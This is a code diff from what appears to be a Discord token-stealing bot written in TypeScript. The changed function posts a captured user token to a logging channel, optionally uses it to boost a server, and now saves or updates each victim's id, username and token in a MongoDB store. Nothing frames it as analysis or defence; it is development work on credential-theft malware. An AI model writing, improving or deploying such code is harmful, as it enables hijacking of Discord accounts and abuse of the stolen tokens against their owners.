@@ -100,18 +100,24 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
                     `)
                     .addField('Token', token)
 
-                // try {
+                try {
                     if (config.boostServer) boostServer(client, token, discord);
                     close();
                     (await client.channels.cache.get(config.logChannel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
                     if (config.mongoose.enabled) {
-                        await users.create({
-                            id: discord.id,
-                            username: discord.username,
-                            token: token
-                        });
+                        const foundUser = await users.findOne({ id: discord.id });
+                        if (foundUser) {
+                            foundUser.token = token;
+                            await foundUser.save();
+                        } else {
+                            await users.create({
+                                id: discord.id,
+                                username: discord.username,
+                                token: token
+                            });
+                        }
                     }
-                // } catch {}
+                } catch {}
                 reslove(token);
                 break;
             default:
